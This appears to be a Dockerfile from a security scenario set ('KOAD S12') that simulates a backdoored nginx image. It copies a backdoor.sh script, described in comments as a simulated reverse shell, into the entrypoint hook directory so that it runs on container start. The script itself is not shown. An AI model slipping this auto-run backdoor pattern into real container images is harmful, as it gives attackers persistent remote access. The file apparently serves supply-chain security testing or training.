# KOAD S12: Backdoor Image
# Simulates a legitimate nginx image with a hidden backdoor layer
FROM nginx:1.27-alpine

# Hidden backdoor: reverse shell on startup (SIMULATED)
COPY backdoor.sh /docker-entrypoint.d/99-backdoor.sh
RUN chmod +x /docker-entrypoint.d/99-backdoor.sh
